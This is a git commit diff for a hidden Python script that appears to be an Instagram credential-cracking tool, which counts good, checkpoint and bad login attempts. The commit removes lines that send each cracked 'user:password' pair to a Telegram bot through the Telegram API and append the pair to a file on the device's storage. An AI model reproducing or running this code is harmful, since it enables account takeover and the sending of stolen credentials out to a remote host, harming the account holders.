73d5bb9fa9934c852e812a38f151d39ddaf4f10d
sfr404sfrzed <86876730+sfr404sfrzed@users.noreply.github.com>
2021-07-28 17:52:07 +0300

    Update .daxl1.py

--- .daxl1.py
+++ .daxl1.py
@@ -154,10 +154,6 @@ def instagram1():
 						print(logo2)
 						checkpoint+=1
 						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-						booom=f"Checkpoint: "+user+":"+pasw
-						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={booom}\n')
-						with open("/sdcard/checkpoint.txt", "a") as dd:
-							dd.write(f"\nuser&num&emil: "+user+":"+pasw)
 					else:
 						os.system("clear")
 						print(logo2)
